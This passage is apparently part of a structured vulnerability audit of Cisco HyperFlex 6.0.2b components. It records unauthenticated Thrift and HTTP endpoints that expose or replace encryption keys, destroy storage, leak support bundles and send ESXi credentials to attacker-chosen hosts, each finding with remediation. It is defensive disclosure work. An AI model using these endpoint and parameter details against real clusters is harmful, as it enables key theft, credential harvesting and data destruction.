            "credential_exposure": "auth=authData carries (opts.user, opts.password) = INSTALLER_PASSWD",
            "source_file": "/opt/hyperflex/deployNodes.py",
        },
        "versions_affected": ["6.0.2b-44423 (installer appliance)"],
        "remediation": (
            "Remove verify=False. Load the installer appliance's self-signed certificate "
            "(generated at deploy time) into a trusted bundle and pass verify='<path>' "
            "to requests calls. If mutual TLS is required, use the vcenter_client key from "
            "the JCEKS keystore (HX-F13) for client certificate auth."
        ),
    },

    "HX-F28": {
        "title": "StPlatform Thrift Interface Exposes 40+ Destructive Storage Operations Without Authentication",
        "severity": "HIGH",
        "component": "/opt/hyperflex/storfs-core/storfs (20MB ELF, storfs daemon, port 9966)",
        "description": (
            "The storfs storage daemon exports its core management interface as a Thrift "
            "StPlatformProcessor with over 40 methods covering destructive storage operations: "
            "formatDisks, deleteFiles, createFiles, removeDisk, retireDisks, blacklistDisks, "
            "unclaimDisks, enableZKAuth, cloneDatastore, teardownNRNFS, and others. "
            "Symbol table analysis of the 20MB storfs ELF (28,996 symbols, not stripped) "
            "confirms no StPlatformAuthorizingProcessor class is present — the standard "
            "authorization wrapper used in other Thrift service deployments is absent. "
            "Disassembly of the representative method process_getCluster (0x9692a0) shows "
            "no authentication or authorization check before dispatching to "
            "StPlatform_getCluster_args::read(TProtocol*). The same pattern is expected "
            "for destructive methods. The StPlatform interface port (9966, confirmed from "
            "storfs binary strings) is exposed on the stCtlVM. Any process that can reach "
            "the storfs Thrift socket can invoke storage-destruction operations "
            "against the HyperFlex cluster data fabric."
        ),
        "code_evidence": {
            "binary": "/opt/hyperflex/storfs-core/storfs (20MB ELF, PIE, partial RELRO, canary, 28996 symbols)",
            "symbol_evidence": "StPlatformProcessor present; StPlatformAuthorizingProcessor absent",
            "destructive_handlers": [
                "process_formatDisks", "process_deleteFiles", "process_createFiles",
                "process_removeDisk", "process_retireDisks", "process_blacklistDisks",
                "process_unclaimDisks", "process_enableZKAuth", "process_cloneDatastore",
                "process_teardownNRNFS",
            ],
            "port": "9966 (from storfs binary string literals)",
            "auth_check_absent": "process_getCluster @ 0x9692a0: direct dispatch to args::read, no auth call",
            "auth_wrapper_absent": "StPlatformAuthorizingProcessor not in symbol table",
        },
        "versions_affected": ["6.0.2b-44423 (stCtlVM)"],
        "remediation": (
            "Introduce an authorization wrapper (analogous to StPlatformAuthorizingProcessor) "
            "that validates a session token on every Thrift call before dispatching. "
            "Restrict the StPlatform port (9966) to loopback only via iptables and verify "
            "that the calling process matches an expected service identity. "
            "Audit all process_* handlers to confirm no production path reaches destructive "
            "operations without a prior privilege check."
        ),
    },

    "HX-F30": {
        "title": "StorfsSupportBundle Servlet Exposes System Support Bundle Generation Without Authentication",
        "severity": "HIGH",
        "component": (
            "ROOT.war / com.storvisor.sysmgmt.service.StorfsSupportBundle "
            "(stCtlVM, URL pattern /storfs-support/*, no filter mapping)"
        ),
        "description": (
            "The StorfsSupportBundle HttpServlet is registered at /storfs-support/* in ROOT.war "
            "web.xml (servlet-mapping at line 67) but has no corresponding filter-mapping entry. "
            "All authentication filters (AuditFilter, SPPrivilegedAuth, SessionAuth, KerberosAuth, "
            "SPBasicAuth, SPAuth) are mapped only to /rest/*, /internalsupport/*, /upload/*, and "
            "/v1/* — leaving /storfs-support/* unprotected. "
            "The servlet accepts GET and POST. With no action parameter it returns an HTML page "
            "with links to ?action=extended and ?action=light. When action=extended it executes "
            "ProcessBuilder(['/bin/bash', '-c', 'exec /bin/storfs-support --extended > /dev/null']) "
            "on the stCtlVM; when action=light it runs 'exec /bin/storfs-support > /dev/null'. "
            "After waiting for the process to exit with code 0, it reads the newest .gz file from "
            "/var/support/ and streams it as application/zip to the unauthenticated caller. "
            "The storfs-support bundle contains system logs, network configuration, disk layout, "
            "ZooKeeper state, and service credentials from the storage controller VM."
        ),
        "code_evidence": {
            "servlet_class": "com.storvisor.sysmgmt.service.StorfsSupportBundle",
            "web_xml_servlet_mapping": "/storfs-support/* (ROOT.war web.xml line 67)",
            "auth_filter_mapping": "None — no filter-mapping for /storfs-support/* in ROOT.war",
            "action_extended_command": "/bin/bash -c exec /bin/storfs-support --extended > /dev/null",
            "action_light_command": "/bin/bash -c exec /bin/storfs-support > /dev/null",
            "output_source": "/var/support/ (newest .gz file via FileUtils.getNewestGzFile)",
            "content_type": "application/zip",
            "bytecode_ref": (
                "StorfsSupportBundle.processRequest offset 151-173 (extended branch), "
                "offset 182-208 (light branch); string literals ldc #101 /bin/bash, "
                "ldc #105 'exec /bin/storfs-support --extended > /dev/null', "
                "ldc #110 'exec /bin/storfs-support > /dev/null', "
                "ldc #166 /var/support/"
            ),
        },
        "versions_affected": ["6.0.2b-44423 (stCtlVM, ROOT.war)"],
        "remediation": (
            "Add filter-mapping entries for /storfs-support/* identical to those for "
            "/internalsupport/* (AuditFilter, SPPrivilegedAuth, SessionAuth, SPBasicAuth, SPAuth). "
            "Require authentication before any support bundle operation on the stCtlVM."
        ),
    },
    "HX-F32": {
        "title": "Diesel Connector KEK Distribution Endpoint Binds to All Interfaces With No Confirmed Client Auth",
        "severity": "HIGH",
        "component": (
            "hxdp-connector Go binary (UPX-packed, 25MB unpacked); "
            "diesel/encryption package — StartEncryptionHandler / getKeyEncryptionKeyHandler; "
            "graceful TLS server on :35333 (0.0.0.0, all interfaces)"
        ),
        "description": (
            "The HyperFlex device connector binary launches a TLS HTTP server on :35333 (all "
            "interfaces) via graceful.(*Server).ListenAndServeTLS. The server registers a "
            "gorilla/mux route GET /v1/hyperflex/KeyEncryptionKeys handled by "
            "(*EncryptionClient).getKeyEncryptionKeyHandler. The handler returns the cluster "
            "Key Encryption Key (KEK) — the root key used to protect all data encryption keys "
            "for the HyperFlex distributed storage layer. "
            "decryptKek() is a method that copies 96 bytes of the EncryptionClient struct onto "
            "the local stack frame and returns the plaintext KEK string at field offsets "
            "+0x48/+0x50 (Go string header: ptr, len). The actual RSA decryption "
            "((*DecryptObjectType).RsaDecrypt at 0xa05ea0, private key /etc/springpath/secure/root_file.pub) "
            "is performed once at connector initialization; subsequent calls to decryptKek() "
            "return the cached plaintext. "
            "The connector_auth package (barcelona/adconnector/connector_auth) provides "
            "clientAuthUsingHash / ClientAuthSha512 using SipHash MAC — but this auth layer "
            "is applied to the WebSocket tunnel toward Cisco Intersight, not to the local "
            ":35333 HTTP endpoint. The HTTP-layer auth middleware baseHandler is defined in "
            "diesel/witness and is called from StartWitnessServer; its application to "
            "StartEncryptionHandler routes could not be statically confirmed from binary "
            "analysis. The server uses only server-side TLS (no static evidence of "
            "tls.Config.ClientAuth = RequireAnyClientCert or RequireAndVerifyClientCert). "
            "Any host on the network that can reach TCP port 35333 and complete a TLS "
            "handshake with the server certificate can issue GET /v1/hyperflex/KeyEncryptionKeys "
            "and receive the KEK. With the KEK, a network-adjacent attacker can decrypt all "
            "data encryption keys protecting the HyperFlex storage cluster."
        ),
        "code_evidence": {
            "binary": "hxdp-connector (UPX-packed Go 1.23.4 ELF, 25,743,512 bytes unpacked)",
            "server_function": "graceful.(*Server).ListenAndServeTLS at functab PC 0x702ac0",
            "bind_address": "':35333' — Go net.Listen default binds to 0.0.0.0:35333 (file 0xfa57d1 in .rodata)",
            "route": (
                "GET /v1/hyperflex/KeyEncryptionKeys — string at .rodata file 0xde0bfc, "
                "directly adjacent (zero-gap) to 'Initializing encryption handler' log string "
                "(file 0xde0bdd) in Go's packed string literal pool"
            ),
            "handler": (
                "(*EncryptionClient).getKeyEncryptionKeyHandler — funcnametab at file 0x11a22f1; "
                "closure (*EncryptionClient).getKeyEncryptionKeyHandler.func1 at file 0x11a2442"
            ),
            "key_retrieval": (
                "(*EncryptionClient).decryptKek at functab PC 0xa05ee0: copies 96-byte "
                "EncryptionClient struct frame (duffcopy at 0x47d44c), returns string at "
                "offset +0x48 (ptr) / +0x50 (len) — plaintext KEK cached after init RSA decrypt"
            ),
            "rsa_decrypt": (
                "(*DecryptObjectType).RsaDecrypt at functab PC 0xa05ea0; "
                "private key path: /etc/springpath/secure/root_file.pub (file 0xdea2d2)"
            ),
            "connector_auth": (
                "barcelona/adconnector/connector_auth — clientAuthUsingHash, ClientAuthSha512 "
                "(SipHash MAC via dchest/siphash@v1.2.3); source: connector_auth.go; "
                "APPLIED TO: WebSocket connector to Intersight, NOT to :35333 HTTP routes"
            ),
            "tls_config": (
                "graceful.ListenAndServeTLS: server-side TLS only; no static evidence of "
                "tls.Config.ClientAuth = RequireAnyClientCert in the :35333 configuration"
            ),
            "base_handler": (
                "diesel/witness.StartWitnessServer.(*witness).baseHandler.func4.1 at functab "
                "PC 0xe0ae20; application to encryption routes unconfirmed from binary analysis"
            ),
            "cipher_type_registry": (
                "adsecret/barcelona cipher types at .rodata file 0xdbcdef: "
                "Locked|STREET|simple|cisco.divide|pbkdf2|bcrypt|shared|system|Fanout|X25519 — "
                "cisco.divide is a proprietary Cisco key-splitting scheme compiled into the binary"
            ),
        },
        "versions_affected": ["hxdp-connector 1.0.11-20250305 (Go 1.23.4)"],
        "remediation": (
            "Bind :35333 to 127.0.0.1 if the KEK endpoint is only consumed by local "
            "HyperFlex services. If network binding is required, enforce mTLS by setting "
            "tls.Config.ClientAuth = RequireAndVerifyClientCert with a per-node CA. "
            "Apply baseHandler auth middleware explicitly to all routes in "
            "StartEncryptionHandler, not only to witness routes. Do not cache the plaintext "
            "KEK in a heap-allocated struct — re-decrypt on demand and zero memory after use."
        ),
    },
    "HX-F31": {
        "title": "StorvisorSupportBundle Servlet Enables Unauthenticated SSRF With ESXi Credential Exfiltration",
        "severity": "HIGH",
        "component": (
            "ROOT.war / com.storvisor.sysmgmt.service.StorvisorSupportBundle "
            "(stCtlVM, URL pattern /st-support/*, no filter mapping)"
        ),
        "description": (
            "The StorvisorSupportBundle HttpServlet is registered at /st-support/* in ROOT.war "
            "web.xml but has no filter-mapping entry — identical misconfiguration to HX-F30. "
            "The servlet reads a host[] query parameter array from the request. For each hostname "
            "it constructs the URL: https://HOSTNAME/cgi-bin/vm-support.cgi?manifests=Springpath:Springpath "
            "(template string from BootstrapMethods constant pool entry #161: "
            "'https://\\u0001/cgi-bin/vm-support.cgi?manifests=Springpath:Springpath'). "
            "It then instantiates HostCredentialsAccess(), which connects to the local cluster "
            "service (localhost) and retrieves stored ESXi host credentials "
            "(EsxCredential.username, EsxCredential.password from ServiceAccess). "
            "WebDownloader.getStream(url, username, password) calls "
            "java.net.Authenticator.setDefault(new Authenticator(username, password)) then "
            "new URL(url).openStream() — sending the ESXi credentials as an HTTP Basic "
            "Authorization header in the outbound request to the attacker-supplied hostname. "
            "The attacker controls the hostname via the host= request parameter, which is "
            "interpolated directly into the HTTPS URL before the credential-authenticated request "
            "is made. The response is streamed back as a zip entry named HOSTNAME.tar.gz."
        ),
        "code_evidence": {
            "servlet_class": "com.storvisor.sysmgmt.service.StorvisorSupportBundle",
            "web_xml_servlet_mapping": "/st-support/* (ROOT.war web.xml line 56)",
            "auth_filter_mapping": "None — no filter-mapping for /st-support/* in ROOT.war",
            "user_controlled_input": "host[] query parameter (HttpServletRequest.getParameterValues('host'))",
            "url_template": (
                "https://HOSTNAME/cgi-bin/vm-support.cgi?manifests=Springpath:Springpath "
                "(BootstrapMethods #1, constant pool #161)"
            ),
            "credential_source": (
                "HostCredentialsAccess() -> ServiceAccess('localhost') -> "
                "EsxCredential.username + EsxCredential.password"
            ),
            "credential_dispatch": (
                "WebDownloader.getStream(url, getUserName(), getPassword()) -> "
                "java.net.Authenticator.setDefault(BasicAuthenticator) -> "
                "new URL(url).openStream()  [Authorization: Basic header sent to attacker host]"
            ),
            "zip_entry_template": "HOSTNAME.tar.gz (BootstrapMethods #0, constant pool #159)",
            "bytecode_ref": (
                "StorvisorSupportBundle.processRequest offset 22-152: "
                "getParameterValues('host') at offset 22-30, "
                "HostCredentialsAccess.<init> at offset 56-63, "
                "invokedynamic #1 URL construction at offset 130-135, "
                "WebDownloader.getStream call at offset 137-152"
            ),
        },
        "versions_affected": ["6.0.2b-44423 (stCtlVM, ROOT.war)"],
        "remediation": (
            "Add filter-mapping entries for /st-support/* identical to those for "
            "/internalsupport/* (AuditFilter, SPPrivilegedAuth, SessionAuth, SPBasicAuth, SPAuth). "
            "Validate that the host parameter matches the expected cluster node IP range before "
            "constructing any outbound URL. Do not use java.net.Authenticator.setDefault() "
            "(JVM-global side effect) for per-request authentication; use per-connection "
            "credential injection instead."
        ),
    },
    "HX-F38": {
        "title": "iSCSI CHAP Credentials Stored in ZooKeeper at Predictable Path /chap/<target>",
        "severity": "HIGH",
        "component": (
            "iscsisvc (hx-iscsi package); ZooKeeper credential store integration. "
            "Source path: /opt/git/cypress/opensrc/istgt/src/chap_util.c"
        ),
        "description": (
            "The iscsisvc binary reads iSCSI CHAP credentials from ZooKeeper at the path "
            "/chap/<target_name> (format string /chap/%s). The ZK node contains a JSON object "
            "{\"chapName\": \"...\", \"chapSecret\": \"<encrypted>\"}. The encrypted secret is "
            "decryptable using key material from /etc/hyperflex/secure/. "
            "ZooKeeper UUID-based auth is controlled by the CRMDB_ZKEnableUUIDAuth runtime flag "
            "(not hardcoded on), making ZK node-level access control optional. "
            "Both u-chap (initiator secret) and s-chap (target secret for mutual CHAP) are "
            "loaded from this ZK path, meaning mutual CHAP secrets are equally exposed. "
            "ZooKeeper Exhibitor is also accessible on port 8180 (see HX-F12)."
        ),
        "code_evidence": {
            "binary": "iscsisvc (ELF 64-bit, not stripped, ~16MB)",
            "zk_path_format": "/chap/%s",
            "json_fields": ["chapName", "chapSecret"],
            "chap_types": "u-chap (initiator), s-chap (mutual target secret)",
            "zk_path_fn": "hx_get_chap_key_path @ 0x28acb0 — snprintf(buf, 0x100, '/chap/%s', name)",
            "zk_read_fn": "hx_istgt_get_json @ 0x23a380 (called from hx_read_chap_json_str)",
            "json_parse_fn": "cJSON_Parse / cJSON_GetObjectItem (chapName, chapSecret)",
            "zk_auth_flag": "CRMDB_ZKEnableUUIDAuth (runtime function, not a compile-time constant)",
            "error_strings": [
                "%sHX_ISTGT_CF: Failed to get chap cred from zk.",
                "%sHX_ISTGT_CF: Failed to parse JSON CHAP zk string %s.",
                "%sHX_ISTGT_CF: Failed to get CHAP user name.",
                "%sHX_ISTGT_CF: Failed to get CHAP secret.",
                "%sHX_ISTGT_CF: Failed to get u-chap. err = %u",
                "%sHX_ISTGT_CF: Failed to get s-chap. err = %u",
            ],
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Enable CRMDB_ZKEnableUUIDAuth on all cluster nodes and set strict ACLs on /chap/* "
            "ZooKeeper nodes. Alternatively, migrate CHAP credential storage off ZooKeeper into "
            "a purpose-built secrets manager. Audit ZooKeeper ACL configuration at deployment time."
        ),
    },
    "HX-F39": {
        "title": "iSCSI Target Accepts AuthMethod None — Storage Accessible Without Authentication",
        "severity": "HIGH",
        "component": (
            "iscsisvc (hx-iscsi package); custom Cisco extension to upstream istgt iSCSI target. "
            "Affects both data sessions (AuthMethod) and discovery sessions (DiscoveryAuthMethod)."
        ),
        "description": (
            "The iscsisvc binary accepts AuthMethod None and DiscoveryAuthMethod None as valid "
            "per-LU and global configuration values. The AuthMethod Auto setting instructs the "
            "target to allow the initiator to choose no authentication. Both are valid runtime "
            "configurations persisted via ZooKeeper (/iscsi/config). When either is set, an "
            "iSCSI initiator can log in without supplying CHAP credentials, gaining direct "
            "block-level read/write access to storage volumes. The config parser also accepts "
            "AuthGroup None and DiscoveryAuthGroup None for group-level auth bypass. "
            "No compile-time enforcement requires CHAP — the protection is entirely deployment-dependent."
        ),
        "code_evidence": {
            "binary": "iscsisvc (ELF 64-bit, not stripped, ~16MB)",
            "auth_method_strings": [
                "%sAuthMethod None",
                "%sAuthMethod Auto",
                "%sAuthMethod %s %s",
                "%sDiscoveryAuthMethod None",
                "%sDiscoveryAuthMethod Auto",
                "%sDiscoveryAuthMethod %s %s",
                "%sAuthGroup None",
                "%sDiscoveryAuthGroup None",
            ],
            "auth_config_error": "%sAuthMethod is empty",
            "config_zk_path": "/iscsi/config",
            "initiator_auth_field": "lu->auth_chap %d (per-LU auth flag)",
            "chap_combined_method": "CHAP,None (comma list — None is a valid member)",
            "no_enforcement": (
                "No hardcoded requirement for CHAP; auth method is loaded from ZK config at runtime"
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Set AuthMethod CHAP and DiscoveryAuthMethod CHAP as mandatory defaults in the "
            "HyperFlex installer and validate on every cluster upgrade. Remove None and Auto "
            "from the set of accepted AuthMethod values, or enforce CHAP at the configuration "
            "management layer with a startup validation check that aborts iscsisvc if auth is None."
        ),
    },
    "HX-F40": {
        "title": "Unauthenticated getDataEncryptionKeys Thrift RPC in storfs — DARE Key Exfiltration",
        "severity": "CRITICAL",
        "component": (
            "storfs (storfs-core package, ELF 64-bit, ~20MB, not stripped). "
            "Class: com::storvisor::sysmgmt::StPlatformEncProcessor. "
            "Thread: sysmgmtNonBlockingEncThreadId (dedicated enc Thrift server thread)."
        ),
        "description": (
            "The storfs binary hosts a dedicated Apache Thrift server "
            "(stNonBlockingEncServer, TNonblockingServer) that exposes the StPlatformEnc service. "
            "The process_getDataEncryptionKeys handler parses the incoming Thrift request, "
            "calls readMessageEnd(), then immediately invokes the handler "
            "StPlatformEncDispatcher::getDataEncryptionKeys without any authentication check. "
            "The args struct StPlatformEnc_getDataEncryptionKeys_args contains no credential fields. "
            "A successful call returns an HxEncryptionData object containing all Data Encryption Keys "
            "(DEKs) for the cluster, which directly defeats the Data At Rest Encryption (DARE) feature. "
            "The dispatchCall implementation is pure string-comparison method routing with no "
            "Thrift-layer auth header validation. The server is started unconditionally by "
            "SysMgmt_InitInternal alongside the main sysmgmt Thrift server."
        ),
        "code_evidence": {
            "binary": "storfs (ELF 64-bit, not stripped, ~20MB)",
            "handler_fn": "StPlatformEncProcessor::process_getDataEncryptionKeys @ 0x9ade70",
            "dispatcher_fn": "StPlatformEncDispatcher::getDataEncryptionKeys @ 0xa2b9e0",
            "args_read_fn": "StPlatformEnc_getDataEncryptionKeys_args::read @ 0x9a7510",
            "args_struct": "StPlatformEnc_getDataEncryptionKeys_args (no auth fields in struct)",
            "return_type": "HxEncryptionData (vtable _ZTVN...16HxEncryptionDataE @ 0x10b7ba0)",
            "server_global": "stNonBlockingEncServer @ BSS:0x1bd0970",
            "server_start_fn": "StartNonBlockingEncServer @ 0x8c2910",
            "server_thread": "_ZL29sysmgmtNonBlockingEncThreadId (created by SysMgmt_InitInternal @ 0x8c1dc0)",
            "dispatch_fn": "StPlatformEncProcessor::dispatchCall @ 0x9af4f0 — string-match dispatch, no auth",
            "kv_key_fn": "KVGetDataEncryptionKey @ 0x61a8d0 (lower-level ZK/KV key retrieval)",
            "auth_check": "NONE — no authentication before handler dispatch confirmed in disasm",
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Bind stNonBlockingEncServer to 127.0.0.1 only. "
            "Add a caller-identity verification step at the Thrift dispatch layer "
            "(TLS mutual auth or a pre-dispatch token check). "
            "If the StPlatformEnc service must remain a Thrift interface, require a session token "
            "verified against the hx-auth service before returning DEK material. "
            "Consider replacing the Thrift enc interface with a Unix-domain socket accessible "
            "only to root-owned processes."
        ),
    },
    "HX-F41": {
        "title": "Unauthenticated setDataEncryptionKeys Thrift RPC in storfs — Key Replacement Attack",
        "severity": "CRITICAL",
        "component": (
            "storfs (storfs-core package, ELF 64-bit, ~20MB, not stripped). "
            "Class: com::storvisor::sysmgmt::StPlatformEncProcessor. "
            "Thread: sysmgmtNonBlockingEncThreadId."
        ),
        "description": (
            "The process_setDataEncryptionKeys handler in the StPlatformEncProcessor Thrift service "
            "accepts an HxEncryptionData struct and calls the handler without authentication. "
            "The args struct StPlatformEnc_setDataEncryptionKeys_args contains the HxEncryptionData "
            "payload (new key material) but no credential or authorization fields. "
            "An unauthenticated caller can replace the cluster Data Encryption Keys with "
            "attacker-controlled values, rendering all encrypted storage volumes permanently "
            "inaccessible — a complete data destruction primitive."
        ),
        "code_evidence": {
            "binary": "storfs (ELF 64-bit, not stripped, ~20MB)",
            "handler_fn": "StPlatformEncProcessor::process_setDataEncryptionKeys @ 0x9ad880",
            "args_read_fn": "StPlatformEnc_setDataEncryptionKeys_args::read @ 0x9a6f50",
            "args_vtable": "_ZTVN...40StPlatformEnc_setDataEncryptionKeys_argsE @ 0x10b74b0",
            "payload_type": "HxEncryptionData (attacker-controlled key_elements vector)",
            "auth_check": "NONE — identical dispatch pattern to HX-F40, confirmed in disasm",
            "server_global": "stNonBlockingEncServer @ BSS:0x1bd0970 (shared with HX-F40)",
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Same remediation as HX-F40: bind to loopback, add TLS mutual auth or token check "
            "at the Thrift dispatch layer. "
            "Additionally: add write-quorum validation requiring multiple node signatures "
            "before any DEK write is accepted, to prevent single-node key replacement attacks."
        ),
    },
    "HX-F42": {
        "title": "Unauthenticated StPlatform Thrift Interface — 80+ Cluster Management Operations Exposed",
        "severity": "CRITICAL",
        "component": (
            "storfs (storfs-core package, ELF 64-bit, ~20MB, not stripped). "
            "Class: com::storvisor::sysmgmt::StPlatformProcessor. "
            "Server: sysmgmtNonBlockingServer (TNonblockingServer, started by SysMgmt_InitInternal). "
            "Service IDL: com.storvisor.sysmgmt.StPlatform."
        ),
        "description": (
            "The main StPlatform Apache Thrift service in storfs exposes 80+ cluster management "
            "methods without any Thrift-layer authentication. The dispatchCall implementation "
            "(StPlatformProcessor::dispatchCall) routes exclusively by method name string comparison "
            "with no preceding token or credential check. Confirmed by disassembly of "
            "process_formatDisks @ 0x9947d0: RTTI type check, args parse, readMessageEnd, "
            "handler call, no auth. "
            "Any caller that can reach the Thrift server port can invoke any of these operations. "
            "The most destructive accessible methods include: formatDisks, shutdownCluster, "
            "deleteDatastore, deleteDatastoreSnapshots, removeNode, removeDisk, clusterUpgrade, "
            "enableZKAuth, resetZkConnectionString, setPlatformClusterAccessPolicy, "
            "setPlatformMaintenanceMode, blacklistDisks, retireDisks, unclaimDisks, "
            "revertDatastoreSnapshot, teardownNRNFS, setDataWriteThru."
        ),
        "code_evidence": {
            "binary": "storfs (ELF 64-bit, not stripped, ~20MB)",
            "confirmed_handler": "process_formatDisks @ 0x9947d0 (same auth-less pattern as HX-F40)",
            "dispatch_fn": "StPlatformProcessor::dispatchCall — string-match routing, no auth gate",
            "server_start_fn": "StartNonBlockingServer @ 0x8c27e0",
            "server_thread": "_ZL26sysmgmtNonBlockingThreadId (created by SysMgmt_InitInternal @ 0x8c1dc0)",
            "total_methods": "80+ process_* handlers in StPlatformProcessor",
            "destructive_methods": [
                "formatDisks — format all drives, destroys all data",
                "shutdownCluster — immediate cluster shutdown (DoS)",
                "deleteDatastore / deleteDatastoreSnapshots — datastore destruction",
                "deleteFiles — arbitrary file deletion",
                "removeNode / removeDisk — cluster topology modification",
                "clusterUpgrade — trigger upgrade with attacker-controlled version map",
                "enableZKAuth / resetZkConnectionString — ZooKeeper state manipulation",
                "setPlatformClusterAccessPolicy — modify cluster access policies",
                "setPlatformMaintenanceMode — partial DoS via forced maintenance",
                "blacklistDisks / retireDisks / unclaimDisks — disk eviction",
                "revertDatastoreSnapshot — rollback data to arbitrary snapshot",
                "teardownNRNFS — tear down NFS replication",
                "setDataWriteThru — toggle write-through caching",
            ],
            "read_only_methods_also_exposed": [
                "getCluster, getNodes, getDisks, getDatastores — topology enumeration",
                "getClusterStats, getCleanerStats, getEnospaceInfo — metrics leak",
                "getAboutInfo — version/build disclosure",
            ],
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Bind the StPlatform Thrift server to 127.0.0.1 only. "
            "Add pre-dispatch authentication at the TNonblockingServer level using a shared secret "
            "or mutual TLS. For write-path methods (formatDisks, deleteDatastore, etc.), require "
            "a session token from hx-auth before the handler is invoked. "
            "For cluster-level destructive operations (formatDisks, shutdownCluster, removeNode), "
            "require explicit operator confirmation via a separate signed request channel."
        ),
    },
    "HX-F43": {
        "title": "Unauthenticated Key Encryption Key (KEK) HTTP Endpoint on Port 35333",
        "severity": "CRITICAL",
        "component": (
            "hxdp-connector (Go 1.23.4 binary, UPX-packed, 25MB unpacked, stripped .symtab). "
            "Module: github-hyc.scm.engit.cisco.com/starship/diesel/encryption. "
            "Source: diesel/code/diesel/encryption/encryption_handler.go. "
            "Struct: (*EncryptionClient). Handler registered by StartEncryptionHandler on HTTP mux."
        ),
        "description": (
            "The hxdp-connector binary listens on port 35333 and serves a Key Encryption Key (KEK) "
            "retrieval endpoint via the getKeyEncryptionKeyHandler method. The registered HTTP handler "
            "closure (getKeyEncryptionKeyHandler.func1, PC=0x9e9ec0) dispatches directly to an inner "
            "handler at 0x9e9f20 with no authentication check before executing KEK retrieval. "
            "The inner handler creates a KeyEncryptionKeyType struct (runtime.newobject), calls "
            "barcelona/adio/json.NewContextWithSkipCustom (0x8746a0) and json.UnmarshalWithCtx "
            "(0x874a20) to parse the request, then calls adcore.UnmarshalJsonToMo* (0x9884a0) to "
            "serialize and return the KEK. There is no Authorization header read, no JWT token "
            "validation, and no session check at any point in this dispatch chain. "
            "The baseHandler method (PC=0x9e9ca0) is a 10-instruction value-packing stub that "
            "immediately returns; it is not an auth middleware. "
            "The apollo/base.appHandler.HandleWithAuth function is present in the binary (JWT "
            "validation via jwt/v4 library) but is not wired to this handler. "
            "Any unauthenticated caller that can reach port 35333 can retrieve the cluster KEK."
        ),
        "code_evidence": {
            "binary": "hxdp-connector (UPX-unpacked, Go 1.23.4, stripped, 25.7MB)",
            "port": 35333,
            "handler_method": "(*EncryptionClient).getKeyEncryptionKeyHandler @ PC=0x9e9b40",
            "registered_closure": "getKeyEncryptionKeyHandler.func1 @ PC=0x9e9ec0",
            "inner_dispatch": "anonymous inner handler @ 0x9e9f20 (called from func1 with no auth check)",
            "call_sequence": [
                "0x9e9f50: runtime.newobject (allocate KeyEncryptionKeyType struct)",
                "0x9e9fa0: barcelona/adio/json.NewContextWithSkipCustom @ 0x8746a0 (request parse context)",
                "0x9e9fc0: barcelona/adio/json.UnmarshalWithCtx @ 0x874a20 (unmarshal request JSON)",
                "0x9e9ff5: barcelona/adcore.UnmarshalJsonToMo* @ 0x9884a0 (serialize KEK response)",
            ],
            "auth_check": "NONE — no Authorization header read, no JWT parse, no middleware gate",
            "baseHandler_confirmed_stub": (
                "baseHandler @ 0x9e9ca0: 10 instructions, saves 6 args to stack, "
                "packs rsi+r8 into rax+rbx, immediate ret — value-packing stub, not auth middleware"
            ),
            "HandleWithAuth_unused": (
                "apollo/base.appHandler.HandleWithAuth present in binary "
                "(jwt/v4 RSA validation via jwt.SigningMethodRSA) but not called from this handler chain"
            ),
            "kek_type_descriptor": "KeyEncryptionKeyType @ 0xfe1900 (struct, size confirmed by newobject call)",
            "start_handler_fn": "StartEncryptionHandler @ PC=0x9e9ae0 (thin wrapper, no auth setup)",
            "pclntab_source": (
                "Function PCs confirmed via Go 1.23 pclntab (magic=0xfffffff1, "
                "plain null-terminated funcnametab, textStart=0x401000)"
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Gate the :35333 KEK endpoint with mutual TLS client certificate authentication "
            "or require a signed bearer token (using the existing jwt/v4 RSA infrastructure "
            "already in the binary via HandleWithAuth). "
            "Bind the listener to 127.0.0.1 only if the KEK endpoint is only needed by "
            "co-located processes. "
            "Rotate any KEK material that may have been retrieved from exposed deployments."
        ),
    },

    "HX-F44": {
        "title": "Unauthenticated SSRF + ESXi Credential Exfiltration via /st-support/* (StorvisorSupportBundle)",
        "severity": "CRITICAL",
        "component": (
            "ROOT-1.0.0.war, deployed under HX Connect REST API (Tomcat, stCtlVM port 443). "
            "Servlet: com.storvisor.sysmgmt.rest.StorvisorSupportBundle. "
            "Mapped to /st-support/* with NO auth filter. "
            "web.xml: servlet-mapping present for /st-support/*, filter-mapping covers only "
            "/rest/*, /internalsupport/*, /upload/*, /v1/* — /st-support/* has zero filter coverage."
        ),
        "description": (
            "StorvisorSupportBundle handles /st-support/* with no authentication filter in the "
            "Servlet filter chain. The servlet accepts a ?host=<ip> array parameter, constructs "
            "a HostCredentialsAccess object to read stored ESXi credentials from "
            "com/storvisor/sysmgmt/EsxCredential (username and password fields), then calls "
            "WebDownloader.getStream(url_with_host_param, username, password) using those credentials "
            "against the attacker-supplied host. The response is returned as a ZIP download. "
            "An unauthenticated attacker can: (1) supply an arbitrary host and observe whether the "
            "cluster's stored ESXi credentials are valid against attacker-controlled targets "
            "(credential harvest via SSRF), and (2) proxy the credential usage against any host "
            "reachable from the stCtlVM. "
            "The auth filter gap is structural: web.xml defines filter-mappings for /rest/*, "
            "/internalsupport/*, /upload/*, and /v1/* only. The /st-support/* path is never covered."
        ),
        "code_evidence": {
            "war": "ROOT-1.0.0.war (stCtlVM, /opt/hyperflex/storfs-restapi/)",
            "servlet_class": "com.storvisor.sysmgmt.rest.StorvisorSupportBundle",
            "url_pattern": "/st-support/*",
            "credential_source": "HostCredentialsAccess -> EsxCredential.username + EsxCredential.password",
            "ssrf_sink": "WebDownloader.getStream(url_with_host_param, username, password)",
            "auth_filter_gap": (
                "web.xml filter-mappings: /rest/*, /internalsupport/*, /upload/*, /v1/* only. "
                "/st-support/* has no filter-mapping entry — zero auth coverage."
            ),
            "parameter": "?host=<ip> (array of host IPs, attacker-controlled)",
            "output": "ZIP of support bundle fetched from supplied host using stored ESXi credentials",
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Add a filter-mapping entry for /st-support/* to the HX Connect auth filter chain in web.xml. "
            "Validate that the host parameter matches a whitelist of known cluster node IPs. "
            "Audit all stored ESXi credential usage paths for similar unfiltered servlet coverage."
        ),
    },

    "HX-F45": {
